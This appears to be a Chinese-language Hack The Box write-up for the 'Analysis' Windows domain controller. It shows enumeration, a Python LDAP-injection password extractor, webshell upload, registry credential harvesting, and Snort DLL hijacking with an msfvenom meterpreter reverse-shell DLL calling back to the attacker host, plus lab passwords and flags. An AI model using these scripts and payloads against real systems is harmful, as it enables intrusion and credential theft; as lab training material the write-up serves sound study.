---
layout: post
title: Analysis - Windows | Hack The Box
category: [Hack The Box]
tags: [active directory pentesting, fuzz, ffuf, ldap injection, dll hijacking]
---

![Analysis.png](https://raw.githubusercontent.com/h0ny/repo/main/images/9e8b8f0ad26d694d.png)

## Enumeration

### Nmap

```console
root@kali:~# nmap -sC -sV -O --min-rate 10000 10.129.230.179
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 20:32 CST
Nmap scan report for analysis.htb (10.129.230.179)
Host is up (0.71s latency).
Not shown: 606 closed tcp ports (reset), 381 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
53/tcp   open  tcpwrapped
80/tcp   open  tcpwrapped
| http-server-header:
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  tcpwrapped
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
389/tcp  open  tcpwrapped
445/tcp  open  tcpwrapped
464/tcp  open  tcpwrapped
593/tcp  open  tcpwrapped
636/tcp  open  tcpwrapped
3268/tcp open  tcpwrapped
3269/tcp open  tcpwrapped
3306/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/23%OT=3306%CT=1%CU=32023%PV=Y%DS=3%DC=I%G=Y%TM=65
OS:D89100%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=
OS:S%TS=U)SEQ(SP=105%GCD=1%ISR=108%TI=RD%CI=I%II=I%TS=U)SEQ(SP=105%GCD=1%IS
OS:R=108%TI=RD%CI=RD%II=I%TS=U)OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53ANW8%O
OS:4=M53ANW8NNS%O5=M53ANW8NNS%O6=M53ANNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFF
OS:F%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0
OS:%Q=)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=
OS:)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=4216%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 3 hops

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-01-23T12:34:46
|_  start_date: N/A
|_clock-skew: 17s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.13 seconds
```

添加域名解析：

```console
root@kali:~# echo "10.129.230.179 analysis.htb" | sudo tee -a /etc/hosts
10.129.230.179 analysis.htb
```

mysql 白名单，不让连接：

```console
root@kali:~# mysql -h 10.10.11.250 -u root
ERROR 1130 (HY000): Host '10.10.14.131' is not allowed to connect to this MySQL server
```

### Subdomain

axfr 查询子域信息失败了：

```console
root@kali:~# dig axfr analysis.htb @10.129.228.90

; <<>> DiG 9.19.17-1-Debian <<>> axfr analysis.htb @10.129.228.90
;; global options: +cmd
; Transfer failed.
```

使用 gobuster 进行子域名枚举：

```console
root@kali:~# gobuster dns -d analysis.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 --timeout 3s --resolver 10.129.136.168:53
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     analysis.htb
[+] Threads:    100
[+] Resolver:   10.129.136.168:53
[+] Timeout:    3s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.analysis.htb

Found: internal.analysis.htb

Found: forestdnszones.analysis.htb

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

添加域名解析：

```console
root@kali:~# echo "10.129.230.179 internal.analysis.htb" | sudo tee -a /etc/hosts
```

### Directory

访问 403：http://internal.analysis.htb/

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/e9efa05e3ce565bd.png)

目录扫描：

```console
root@kali:~# feroxbuster -u http://internal.analysis.htb/ -s 200,204,301,302,401,403,405 -d 2 -x php -t 300 -k --dont-scan '(?i)(js|css|images|img)'

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://internal.analysis.htb/
 🚫  Don't Scan Regex      │ (?i)(js|css|images|img)
 🚀  Threads               │ 300
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       29l       93w     1284c http://internal.analysis.htb/
301      GET        2l       10w      170c http://internal.analysis.htb/users => http://internal.analysis.htb/users/
301      GET        2l       10w      174c http://internal.analysis.htb/dashboard => http://internal.analysis.htb/dashboard/
200      GET        1l        2w       17c http://internal.analysis.htb/users/list.php
301      GET        2l       10w      170c http://internal.analysis.htb/Users => http://internal.analysis.htb/Users/
302      GET        1l        1w        3c http://internal.analysis.htb/dashboard/logout.php => ../employees/login.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/lib => http://internal.analysis.htb/dashboard/lib/
200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/upload.php
200      GET        4l        5w       38c http://internal.analysis.htb/dashboard/index.php
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/uploads => http://internal.analysis.htb/dashboard/uploads/
301      GET        2l       10w      174c http://internal.analysis.htb/employees => http://internal.analysis.htb/employees/
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/form.php
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/Uploads => http://internal.analysis.htb/dashboard/Uploads/
200      GET       30l       60w     1085c http://internal.analysis.htb/employees/login.php
200      GET       30l       60w     1085c http://internal.analysis.htb/employees/Login.php
200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/Upload.php
200      GET        1l        2w       17c http://internal.analysis.htb/Users/list.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/tickets.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/details.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/emergency.php
200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/UPLOAD.php
200      GET        1l        2w       17c http://internal.analysis.htb/users/List.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/Lib => http://internal.analysis.htb/dashboard/Lib/
200      GET        1l        2w       17c http://internal.analysis.htb/Users/List.php
302      GET        1l        1w        3c http://internal.analysis.htb/dashboard/Logout.php => ../employees/login.php
301      GET        2l       10w      174c http://internal.analysis.htb/Dashboard => http://internal.analysis.htb/Dashboard/
302      GET        1l        1w        3c http://internal.analysis.htb/Dashboard/logout.php => ../employees/login.php
200      GET        0l        0w        0c http://internal.analysis.htb/Dashboard/upload.php
301      GET        2l       10w      178c http://internal.analysis.htb/Dashboard/lib => http://internal.analysis.htb/Dashboard/lib/
200      GET        4l        5w       38c http://internal.analysis.htb/Dashboard/index.php
301      GET        2l       10w      182c http://internal.analysis.htb/Dashboard/uploads => http://internal.analysis.htb/Dashboard/uploads/
200      GET        4l        4w       35c http://internal.analysis.htb/Dashboard/form.php
200      GET        4l        5w       38c http://internal.analysis.htb/dashboard/Index.php
301      GET        2l       10w      182c http://internal.analysis.htb/Dashboard/Uploads => http://internal.analysis.htb/Dashboard/Uploads/
200      GET        0l        0w        0c http://internal.analysis.htb/Dashboard/Upload.php
200      GET        4l        4w       35c http://internal.analysis.htb/Dashboard/tickets.php
200      GET        4l        4w       35c http://internal.analysis.htb/Dashboard/details.php
200      GET        4l        4w       35c http://internal.analysis.htb/Dashboard/emergency.php
200      GET        0l        0w        0c http://internal.analysis.htb/Dashboard/UPLOAD.php
301      GET        2l       10w      178c http://internal.analysis.htb/Dashboard/Lib => http://internal.analysis.htb/Dashboard/Lib/
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/Form.php
302      GET        1l        1w        3c http://internal.analysis.htb/Dashboard/Logout.php => ../employees/login.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/Details.php
301      GET        2l       10w      174c http://internal.analysis.htb/Employees => http://internal.analysis.htb/Employees/
200      GET        4l        5w       38c http://internal.analysis.htb/Dashboard/Index.php
200      GET       30l       60w     1085c http://internal.analysis.htb/Employees/login.php
200      GET       30l       60w     1085c http://internal.analysis.htb/Employees/Login.php
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/UPLOADS => http://internal.analysis.htb/dashboard/UPLOADS/
200      GET        4l        4w       35c http://internal.analysis.htb/Dashboard/Form.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/Emergency.php
200      GET        4l        4w       35c http://internal.analysis.htb/Dashboard/Details.php
301      GET        2l       10w      182c http://internal.analysis.htb/Dashboard/UPLOADS => http://internal.analysis.htb/Dashboard/UPLOADS/
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/Tickets.php
200      GET       30l       60w     1085c http://internal.analysis.htb/employees/LOGIN.php
200      GET        4l        4w       35c http://internal.analysis.htb/Dashboard/Emergency.php
200      GET        4l        4w       35c http://internal.analysis.htb/Dashboard/Tickets.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/LIB => http://internal.analysis.htb/dashboard/LIB/
200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/UpLoad.php
301      GET        2l       10w      178c http://internal.analysis.htb/Dashboard/LIB => http://internal.analysis.htb/Dashboard/LIB/
200      GET       30l       60w     1085c http://internal.analysis.htb/Employees/LOGIN.php
200      GET        0l        0w        0c http://internal.analysis.htb/Dashboard/UpLoad.php
[####################] - 4m    210060/210060  0s      found:61      errors:1872
[####################] - 4m     30000/30000   137/s   http://internal.analysis.htb/
[####################] - 4m     30000/30000   138/s   http://internal.analysis.htb/users/
[####################] - 4m     30000/30000   139/s   http://internal.analysis.htb/dashboard/
[####################] - 4m     30000/30000   140/s   http://internal.analysis.htb/Users/
[####################] - 4m     30000/30000   140/s   http://internal.analysis.htb/employees/
[####################] - 3m     30000/30000   151/s   http://internal.analysis.htb/Dashboard/
[####################] - 3m     30000/30000   157/s   http://internal.analysis.htb/Employees/
```

### FUZZ

提示缺少参数：http://internal.analysis.htb/users/list.php

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/d4b2240c7f279b93.png)

FUZZ 参数名：（burp-parameter-names.txt）

```console
root@kali:~# ffuf -c -u 'http://internal.analysis.htb/users/list.php?FUZZ' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 300 -fs 17

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 17
________________________________________________

name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 363ms]
:: Progress: [6453/6453] :: Job [1/1] :: 848 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

FUZZ 用户名：

```console
root@kali:~# ffuf -c -u 'http://internal.analysis.htb/users/list.php?name=FUZZ' -w /usr/share/seclists/Usernames/cirt-default-usernames.txt -fs 406

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?name=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/cirt-default-usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 406
________________________________________________

(created)               [Status: 200, Size: 8, Words: 1, Lines: 1, Duration: 119ms]
(NULL)                  [Status: 200, Size: 8, Words: 1, Lines: 1, Duration: 134ms]
(any)                   [Status: 200, Size: 8, Words: 1, Lines: 1, Duration: 134ms]
technician              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 112ms]
:: Progress: [828/828] :: Job [1/1] :: 363 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

## Initial Foothold

### LDAP Injection

存在 LDAP 注入地址：[http://internal.analysis.htb/users/list.php?name=\*](http://internal.analysis.htb/users/list.php?name=*)

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/4ecce850099154ed.png)

利用以下脚本，可以检索出 technician 用户的密码：（脚本来源于网络）

```python
import argparse
import requests
import urllib.parse

def main():

    charset_path = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"

    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    found_chars = ""
    skip_count = 6
    add_star = True

    with open(charset_path, 'r') as file:
        for char in file:
            char = char.strip()

            # URL encode the character
            char_encoded = urllib.parse.quote(char)

            # Check if '*' is found and skip the first 6 '*' characters
            if '*' in char and skip_count > 0:
                skip_count -= 1
                continue

            # Add '*' after encountering it for the first time
            if '*' in char and add_star:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                add_star = False
                continue

            modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)

            response = requests.get(modified_url)

            if "technician" in response.text and response.status_code == 200:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")

                file.seek(0, 0)

if __name__ == "__main__":
    main()
```

获取到密码：

```console
root@kali:~# python3 ldap_injection.py
[+] Found Password: 9
[+] Found Password: 97
[+] Found Password: 97N
[+] Found Password: 97NT
[+] Found Password: 97NTt
[+] Found Password: 97NTtl
[+] Found Password: 97NTtl*
[+] Found Password: 97NTtl*4
[+] Found Password: 97NTtl*4Q
[+] Found Password: 97NTtl*4QP
[+] Found Password: 97NTtl*4QP9
[+] Found Password: 97NTtl*4QP96
[+] Found Password: 97NTtl*4QP96B
[+] Found Password: 97NTtl*4QP96Bv
[+] Found Password: 97NTtl*4QP96Bv
[+] Found Password: 97NTtl*4QP96Bv
```

### Upload WebShell

用户邮箱 `technician@analysis.htb`  
密码 `97NTtl*4QP96Bv`  
登录：[http://internal.analysis.htb/employees/login.php](http://internal.analysis.htb/employees/login.php)

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/890c8f5a994d4b05.png)

后台直接上传 webshell：[http://internal.analysis.htb/dashboard/form.php](http://internal.analysis.htb/dashboard/form.php)

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/ed74c5add75832dd.png)

返回部分路径 `uploads/xxx.php`。完整的 webshell 路径，根据之前爆破出的目录进行拼接得到：[http://internal.analysis.htb/dashboard/uploads/shell.php](http://internal.analysis.htb/dashboard/uploads/shell.php)

此时，获取到 svc_web 服务的权限，但该服务没有 SeImpersonatePrivilege 特权，无法使用 Potato 进行提权：

```console
PS C:\inetpub\internal\dashboard\uploads> whoami
analysis\svc_web
PS C:\inetpub\internal\dashboard\uploads> cmd /c whoami /priv

Informations de privil?ges
----------------------

Nom de privil?ge              Description                                     ?tat
============================= =============================================== =========
SeIncreaseQuotaPrivilege      Ajuster les quotas de m?moire pour un processus D?sactiv?
SeMachineAccountPrivilege     Ajouter des stations de travail au domaine      D?sactiv?
SeAuditPrivilege              G?n?rer des audits de s?curit?                  D?sactiv?
SeChangeNotifyPrivilege       Contourner la v?rification de parcours          Activ?
SeIncreaseWorkingSetPrivilege Augmenter une plage de travail de processus     D?sactiv?
```

### Pivoting from svc_web to jdoe

从自动登录的注册表路径中，检索到 jdoe 用户密码：

```console
PS C:\inetpub\internal\dashboard\uploads> ls C:\Users

    R?pertoire?: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/01/2024     10:33                Administrateur
d-----       05/01/2024     21:29                jdoe
d-r---       07/05/2023     21:44                Public
d-----       26/05/2023     11:02                soc_analyst
d-----       26/05/2023     14:20                webservice
d-----       23/05/2023     10:10                wsmith

PS C:\inetpub\internal\dashboard\uploads> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    analysis.htb.
    DefaultUserName    REG_SZ    jdoe
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x103bff874
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
    LastUsedUsername    REG_SZ    jdoe

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

登录用户，获取到 user flag：

```console
root@kali:~# evil-winrm -i analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'
Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami
analysis\jdoe

*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\jdoe\Documents> type C:\Users\jdoe\Desktop\user.txt
67ddf046f678973df90b78f55092f400
```

## Privilege Escalation

### Dll Hijacking

Privilege escalation from Chris to root

在 C 盘中，找到一个 Snort 目录：

```console
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/12/2023  10:01 AM                inetpub
d-----        11/5/2022   8:14 PM                PerfLogs
d-----         5/8/2023  10:20 AM                PHP
d-----         7/9/2023  10:54 AM                private
d-r---       11/18/2023   9:56 AM                Program Files
d-----         5/8/2023  10:11 AM                Program Files (x86)
d-----         7/9/2023  10:57 AM                Snort
d-r---        5/26/2023   2:20 PM                Users
d-----        1/10/2024   3:52 PM                Windows
-a----        1/23/2024   3:02 PM         289730 snortlog.txt


*Evil-WinRM* PS C:\> Get-Acl C:\Snort | Format-List

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Snort
Owner  : BUILTIN\Administrateurs
Group  : ANALYSIS\Utilisateurs du domaine
Access : AUTORITE NT\Système Allow  FullControl
         BUILTIN\Administrateurs Allow  FullControl
         BUILTIN\Utilisateurs Allow  ReadAndExecute, Synchronize
         BUILTIN\Utilisateurs Allow  AppendData
         BUILTIN\Utilisateurs Allow  CreateFiles
         CREATEUR PROPRIETAIRE Allow  268435456
Audit  :
Sddl   : O:BAG:DUD:AI(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;0x1200a9;;;BU)(A;CIID;LC;;;BU)(A;CIID;DC;;;BU)(A;OICIIOID;GA;;;CO)

```

根据 [CVE-2016-1417](https://vigilance.fr/vulnerability/Snort-executing-DLL-code-via-tcapi-dll-20752) 漏洞的描述，Snort 使用了外部 DLL，当工作目录包含恶意 tcapi.dll 文件时，会自动加载它。

首先，先制作一个恶意的 dll 文件：

```console
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.41 lport=4444 -f dll -o tcapi.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: tcapi.dll
```

使用 msf 开启监听：

```console
root@kali:~# msfconsole -q -x 'handler -H 0.0.0.0 -P 4444 -p windows/x64/meterpreter/reverse_tcp'
[*] Starting persistent handler(s)...
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 0.0.0.0:4444
[msf](Jobs:1 Agents:0) >> jobs

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://0.0.0.0:4444

[msf](Jobs:1 Agents:0) >>
```

上传恶意 dll 到指定目录：

```console
*Evil-WinRM* PS C:\> upload tcapi.dll C:\Snort\lib\snort_dynamicpreprocessor\
Info: Uploading /home/kali/Desktop/tcapi.dll to C:\Snort\lib\snort_dynamicprepreocessor\

Data: 12288 bytes of 12288 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\>
```

稍等一会（20 秒左右），就会收到 shell 了：

```console
[msf](Jobs:1 Agents:0) >>
[*] Sending stage (200774 bytes) to 10.129.230.179
[*] Meterpreter session 1 opened (10.10.14.41:4444 -> 10.129.230.179:49932) at 2024-01-23 12:48:50 +0000

[msf](Jobs:1 Agents:1) >> sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  ANALYSIS\Administrateur @ DC-ANALYSIS  10.10.14.41:4444 -> 10.129.230.179:49932 (10.129.230.179)

[msf](Jobs:1 Agents:1) >> sessions 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Windows\system32) > getuid
Server username: ANALYSIS\Administrateur
(Meterpreter 1)(C:\Windows\system32) > sysinfo
Computer        : DC-ANALYSIS
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : fr_FR
Domain          : ANALYSIS
Logged On Users : 12
Meterpreter     : x64/windows
(Meterpreter 1)(C:\Windows\system32) > load powershell
Loading extension powershell...Success.
(Meterpreter 1)(C:\Windows\system32) > powershell_shell
PS > type C:\Users\Administrateur\Desktop\root.txt
919c67fd6ea55eefcb7bf9870f599215
```
